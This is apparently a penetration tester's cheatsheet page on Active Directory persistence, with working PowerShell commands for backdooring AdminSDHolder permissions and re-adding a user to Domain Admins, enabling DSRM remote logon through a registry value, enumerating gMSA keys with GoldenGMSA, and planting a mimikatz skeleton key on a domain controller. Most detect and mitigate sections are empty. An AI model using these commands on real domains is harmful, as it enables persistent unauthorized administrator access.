---
layout: post
title: pen / ad / persist
category: pen
parent: cheatsheets
modified_date: 2024-11-28
permalink: /pen/ad/persist
---

**Menu**
<!-- vscode-markdown-toc -->
* [adminsdholder](#adminsdholder)
	* [play](#play)
	* [detect](#detect)
	* [mitigate](#mitigate)
* [dacl-abuse](#dacl-abuse)
	* [play](#play)
	* [detect](#detect)
	* [mitigate](#mitigate)
* [dc-shadow](#dc-shadow)
	* [play](#play)
	* [detect](#detect)
	* [mitigate](#mitigate)
* [dsrm](#dsrm)
	* [play](#play)
	* [detect](#detect)
	* [mitigate](#mitigate)
* [golden-gmsa](#golden-gmsa)
	* [play](#play)
	* [detect](#detect)
	* [mitigate](#mitigate)
* [security-descriptors](#security-descriptors)
	* [play](#play)
		* [set-remoteWMI](#set-remoteWMI)
		* [set-remotePSRemoting](#set-remotePSRemoting)
		* [add-remoteRegBackdoor](#add-remoteRegBackdoor)
	* [detect](#detect)
	* [mitigate](#mitigate)
* [skeleton-key](#skeleton-key)
	* [play](#play)
	* [detect](#detect)
	* [mitigate](#mitigate)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->


## <a name='adminsdholder'></a>adminsdholder

- special AD container with some "default" security permissions that is used as a template for protected AD accounts and groups
- roll backs the security permissions for protected accounts and group every 60 minutes

### <a name='play'></a>play
```powershell
# add the user to the adminsdholder group 
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName spotless -Verbose -Rights All

# check the user has genericAll over the 'Domain Admins' group
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}

# add the user back to the 'Domain Admins' group
net group "domain admins" spotless /add /domain
```

### <a name='detect'></a>detect

### <a name='mitigate'></a>mitigate

## <a name='dacl-abuse'></a>dacl-abuse

### <a name='play'></a>play
```powershell
```
### <a name='detect'></a>detect

### <a name='mitigate'></a>mitigate

## <a name='dc-shadow'></a>dc-shadow

### <a name='play'></a>play
```powershell
```
### <a name='detect'></a>detect

### <a name='mitigate'></a>mitigate

## <a name='dsrm'></a>dsrm

### <a name='play'></a>play

- DSRM stands for 'Directory Services Restore Mode'
- allows remote access to the DC for the local admin accounts
- dump of local admins hash is required + activation of the feature in the **registry** 

```powershell
# check if the key exists and get the value
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# change value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  
``` 

### <a name='detect'></a>detect

### <a name='mitigate'></a>mitigate

## <a name='golden-gmsa'></a>golden-gmsa

### <a name='play'></a>play

- Group Managed Service Accounts (gMSA), which are managed directly by AD, with a strong password and a regular password rotation
- password are computed based on KDS root keys + gMSA account 'msDS-ManagedPassword' attribute value
- hack implemented by [semperis/goldenGMSA](https://github.com/Semperis/GoldenGMSA) tool 

```powershell
# enumerate KDS root keys,  SID, RootKeyGuid, Password ID
GoldenGMSA.exe gmsainfo

# enumeration for a single gMSA
GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
```

### <a name='detect'></a>detect

### <a name='mitigate'></a>mitigate

- [trustedsec](https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks)

```powershell
```


## <a name='security-descriptors'></a>security-descriptors

### <a name='play'></a>play

#### <a name='set-remoteWMI'></a>set-remoteWMI
```powershell
```

#### <a name='set-remotePSRemoting'></a>set-remotePSRemoting
```powershell
```

#### <a name='add-remoteRegBackdoor'></a>add-remoteRegBackdoor
```powershell
```

### <a name='detect'></a>detect

### <a name='mitigate'></a>mitigate

* [](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
* [](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-play/how-to-play-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## <a name='skeleton-key'></a>skeleton-key

### <a name='play'></a>play

- hack that injects a master password into the lsass process on a DC
- enables the adversary to authenticate as any user without password
- does not persist to reboot

```powershell
# execution on a DC
invoke-mimi 'misc::skeleton'
```

### <a name='detect'></a>detect

### <a name='mitigate'></a>mitigate